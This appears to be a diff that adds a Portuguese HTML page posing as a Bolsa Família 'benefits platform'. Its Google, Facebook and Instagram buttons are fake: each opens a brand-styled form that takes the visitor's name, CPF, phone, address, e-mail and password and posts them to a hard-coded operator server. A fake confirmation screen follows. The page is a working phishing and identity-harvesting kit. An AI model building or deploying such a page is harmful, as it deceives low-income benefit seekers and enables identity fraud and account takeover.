@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Plataforma de Benefícios</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #0f172a; color: white; text-align: center; padding: 20px; }
+        .tela { display: none; } .ativa { display: block; }
+        .box { background: #1e293b; padding: 25px; width: 90%; max-width: 350px; margin: auto; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+        input { display: block; margin: 10px auto; padding: 12px; width: 90%; border-radius: 6px; border: 1px solid #334155; background: #0f172a; color: white; }
+        button { padding: 12px; width: 100%; margin-top: 10px; cursor: pointer; border-radius: 6px; border: none; font-weight: bold; transition: 0.3s; }
+        .btn-verde { background: #22c55e; color: white; }
+        .btn-google { background: #ffffff; color: #444; border: 1px solid #ddd; }
+        .btn-facebook { background: #1877f2; color: white; }
+        .btn-instagram { background: linear-gradient(45deg, #f09433, #dc2743, #bc1888); color: white; }
+        .card-interno { background: #0f172a; padding: 15px; border-radius: 8px; text-align: left; border-left: 4px solid #3b82f6; margin-top: 15px; }
+        hr { border: 0.1px solid #334155; margin: 20px 0; }
+        ul { text-align: left; font-size: 13px; color: #94a3b8; }
+        li { margin-bottom: 8px; }
+    </style>
+</head>
+<body>
+
+<div id="tela-inicial" class="tela ativa">
+    <h2>Bem-vindo</h2>
+    <div class="box">
+        <button class="btn-verde" onclick="abrirCadastro('Formulário')">Cadastrar com E-mail</button>
+        <hr>
+        <button class="btn-google" onclick="abrirCadastro('Google')">Entrar com Google</button>
+        <button class="btn-facebook" onclick="abrirCadastro('Facebook')">Entrar com Facebook</button>
+        <button class="btn-instagram" onclick="abrirCadastro('Instagram')">Entrar com Instagram</button>
+        <p><a href="#" onclick="mudarTela('tela-login')" style="color:#22c55e">Já tenho conta</a></p>
+    </div>
+</div>
+
+<div id="tela-cadastro" class="tela">
+    <h2 id="tituloCadastro">Cadastro</h2>
+    <div class="box">
+        <input id="nome" placeholder="Nome Completo" autocomplete="off">
+        <input id="email" placeholder="E-mail" autocomplete="off">
+        <input id="cpf" placeholder="CPF" autocomplete="off">
+        <input id="telefone" placeholder="Telefone" autocomplete="off">
+        <input id="endereco" placeholder="Endereço" autocomplete="off">
+        <input id="senha" type="password" placeholder="Crie uma Senha">
+        <button id="btnFinalizar" class="btn-verde" onclick="finalizarCadastro()">Confirmar Cadastro</button>
+        <button onclick="mudarTela('tela-inicial')" style="background:transparent; color:#94a3b8">Voltar</button>
+    </div>
+</div>
+
+<div id="tela-login" class="tela">
+    <h2>Login</h2>
+    <div class="box">
+        <input id="loginEmail" placeholder="E-mail">
+        <input id="loginSenha" type="password" placeholder="Senha">
+        <button class="btn-verde" onclick="login()">Entrar no Sistema</button>
+        <button onclick="mudarTela('tela-inicial')" style="background:transparent; color:#94a3b8">Voltar</button>
+    </div>
+</div>
+
+<div id="tela-interna" class="tela">
+    <h2 style="color:#22c55e">🎉 Acesso Confirmado!</h2>
+    <div class="box" style="max-width: 450px;">
+        <p>Olá, <strong id="user-nome"></strong>!</p>
+        
+        <div class="card-interno">
+            <h3 style="color: #3b82f6; text-align: center;">Programa Bolsa Família</h3>
+            <p style="font-size: 14px; line-height: 1.5;">
+                O programa busca garantir renda básica para famílias em situação de vulnerabilidade. Para ter direito, é necessário cumprir os seguintes termos:
+            </p>
+            <ul>
+                <li>Renda familiar por pessoa de até R$ 218,00.</li>
+                <li>Cadastro Único (CadÚnico) atualizado.</li>
+                <li>Frequência escolar de crianças e jovens.</li>
+                <li>Acompanhamento de saúde e vacinação.</li>
+                <li>Dúvidas? Ligue para o Disque Social 121</li>
+                <li>Valor do benefício: R$ 190,00 por família (pode variar conforme composição familiar).</li>
+            </ul>
+            <p style="font-size: 12px; background: #1e293b; padding: 8px; border-radius: 4px;">
+                <strong>Seu Protocolo:</strong> <span id="user-prot" style="color: #22c55e;"></span>
+            </p>
+        </div>
+
+        <button onclick="location.reload()" style="background:#ef4444; color:white; margin-top:20px">Sair com Segurança</button>
+    </div>
+</div>
+
+<script>
+    const URL_API = "http://192.168.15.5:3000"; // COLOQUE SEU IP AQUI!
+    let metodoAtual = "";
+
+    function mudarTela(id) {
+        document.querySelectorAll('.tela').forEach(t => t.classList.remove('ativa'));
+        document.getElementById(id).classList.add('ativa');
+    }
+
+    function abrirCadastro(metodo) {
+        // LIMPEZA DE CAMPOS PARA O CELULAR
+        ["nome", "email", "cpf", "telefone", "endereco", "senha"].forEach(id => document.getElementById(id).value = "");
+        
+        metodoAtual = metodo;
+        mudarTela('tela-cadastro');
+        document.getElementById("tituloCadastro").innerText = "Cadastro via " + metodo;
+        
+        const btn = document.getElementById("btnFinalizar");
+        btn.className = ""; 
+        if(metodo === 'Google') btn.classList.add("btn-google");
+        else if(metodo === 'Facebook') btn.classList.add("btn-facebook");
+        else if(metodo === 'Instagram') btn.classList.add("btn-instagram");
+        else btn.classList.add("btn-verde");
+    }
+
+    async function finalizarCadastro() {
+        const dados = {
+            nome: document.getElementById("nome").value,
+            email: document.getElementById("email").value,
+            cpf: document.getElementById("cpf").value,
+            telefone: document.getElementById("telefone").value,
+            endereco: document.getElementById("endereco").value,
+            senha: document.getElementById("senha").value,
+            metodo: metodoAtual
+        };
+
+        if(!dados.nome || !dados.email || !dados.senha) return alert("Preencha os campos!");
+
+        try {
+            const res = await fetch(`${URL_API}/usuario`, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify(dados)
+            });
+            if(res.ok) {
+                if(metodoAtual !== "Formulário") {
+                    fazerLogin(dados.email, dados.senha);
+                } else {
+                    alert("✅ Cadastro ok! Faça login.");
+                    mudarTela('tela-login');
+                }
+            } else {
+                const err = await res.json();
+                alert("❌ " + err.erro);
+            }
+        } catch (e) { alert("Erro de conexão"); }
+    }
+
+    async function login() {
+        const email = document.getElementById("loginEmail").value;
+        const senha = document.getElementById("loginSenha").value;
+        fazerLogin(email, senha);
+    }
+
+    async function fazerLogin(email, senha) {
+        try {
+            const res = await fetch(`${URL_API}/login-acesso`, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({ email, senha })
+            });
+            const data = await res.json();
+            if(res.ok) {
+                document.getElementById("user-nome").innerText = data.usuario;
+                document.getElementById("user-prot").innerText = data.protocolo;
+                mudarTela('tela-interna');
+            } else alert("❌ Dados incorretos");
+        } catch (e) { alert("Erro no servidor"); }
+    }
+</script>
+</body>
+</html>
